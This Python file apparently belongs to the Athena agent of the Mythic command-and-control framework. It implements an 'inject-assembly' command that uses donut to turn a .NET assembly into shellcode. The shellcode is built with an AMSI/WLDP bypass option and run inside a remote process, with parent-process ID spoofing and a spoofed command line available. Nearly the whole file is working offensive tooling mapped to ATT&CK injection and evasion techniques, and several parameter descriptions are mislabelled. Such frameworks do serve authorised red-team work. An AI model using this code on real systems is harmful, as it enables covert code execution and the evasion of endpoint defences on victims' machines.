from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from .athena_utils.mythicrpc_utilities import *
from .athena_utils.bof_utilities import *
import donut
import tempfile
import base64
import os
import json
# create a class that extends TaskArguments class that will supply all the arguments needed for this command
class InjectAssemblyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        # this is the part where you'd add in your additional tasking parameters
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="The assembly to inject",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=0,
                    )
                ],
            ),
            CommandParameter(
                name="commandline",
                type=ParameterType.String,
                description="The name of the process to inject into",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1,
                    )
                ],
            ),
            CommandParameter(
                name="arguments",
                type=ParameterType.String,
                description = "Arguments that are passed to the assembly",
                default_value = "",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=2,
                    )
                ],
            ),
            CommandParameter(
                name="parent",
                type=ParameterType.Number,
                description = "If set, will spoof the parent process ID",
                default_value = 0,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=3,
                    )
                ],
            ),
            CommandParameter(
                name="spoofedcommandline",
                type=ParameterType.String,
                description="Display assembly output. Default: True",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=4,
                    )
                ],
            ),
            CommandParameter(
                name="output",
                type=ParameterType.Boolean,
                description = "Display assembly output. Default: True",
                default_value = True,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=5,
                    )
                ],
            ),
            CommandParameter(
                name="arch",
                type=ParameterType.ChooseOne,
                choices=["x86","x64", "AnyCPU"],
                description="Target architecture for loader",
                default_value="AnyCPU",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=6,
                    )
                ],
            ),
            CommandParameter(
                name="bypass",
                type=ParameterType.Number,
                description="Behavior for bypassing AMSI/WLDP : 1=None, 2=Abort on fail, 3=Continue on fail (default)",
                default_value=3,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=7,
                    )
                ],
            ),
            CommandParameter(
                name="exit_opt",
                type=ParameterType.Number,
                description="Determines how the loader should exit. 1=exit thread, 2=exit process (default), 3=Do not exit or cleanup and block indefinitely",
                default_value = 2,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=8,
                    )
                ],
            ),
        ]

    # you must implement this function so that you can parse out user typed input into your paramters or load your parameters based on some JSON input
    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)


# this is information about the command itself
class InjectAssemblyCommand(CommandBase):
    cmd = "inject-assembly"
    needs_admin = False
    script_only = True
    help_cmd = "inject-assembly"
    description = "Use donut to convert a .NET assembly into shellcode and execute the buffer in a remote process"
    version = 1
    author = ""
    argument_class = InjectAssemblyArguments
    attackmapping = ["T1055", "T1564.010", "T1134.004"]
    browser_script = None
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False
    )
    completion_functions = {"command_callback": default_coff_completion_callback}

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        # Retrieve and decode the file
        file_contents = await get_mythic_file(taskData.args.get_arg("file"))
        original_fileName = await get_mythic_file_name(taskData.args.get_arg("file"))
        decoded_file_contents = base64.b64decode(file_contents)

        # Create a temporary directory and save the assembly file
        with tempfile.TemporaryDirectory() as temp_dir:
            assembly_path = os.path.join(temp_dir, "assembly.exe")
            with open(assembly_path, "wb") as file:
                file.write(decoded_file_contents)

            # Determine architecture for donut
            arch_mapping = {"AnyCPU": 3, "x64": 2, "x86": 1}
            donut_arch = arch_mapping.get(taskData.args.get_arg("arch"), 0)

            # Generate shellcode with donut
            shellcode = donut.create(
                file=assembly_path,
                arch=donut_arch,
                bypass=taskData.args.get_arg("bypass"),
                params=taskData.args.get_arg("arguments"),
                exit_opt=taskData.args.get_arg("exit_opt"),
            )

        # Create Mythic file for the shellcode
        shellcode_file = await create_mythic_file(
            taskData.Task.ID, shellcode, "shellcode.bin", delete_after_fetch=True
        )

        # Create subtask
        subtask_params = {
            "file": shellcode_file.AgentFileId,
            "commandline": taskData.args.get_arg("commandline"),
            "spoofedcommandline": taskData.args.get_arg("spoofedcommandline"),
            "output": taskData.args.get_arg("output"),
            "parent": taskData.args.get_arg("parent"),
        }
        subtask = await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                taskData.Task.ID,
                CommandName="inject-shellcode",
                SubtaskCallbackFunction="command_callback",
                Params=json.dumps(subtask_params),
                Token=taskData.Task.TokenID,
            )
        )

        # Handle subtask failure
        if not subtask.Success:
            raise Exception(f"Failed to create subtask: {subtask.Error}")
        response.DisplayParams = f"{original_fileName} {taskData.args.get_arg("arguments")} into {taskData.args.get_arg("commandline").split(" ")[0]}"
        return response


    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass

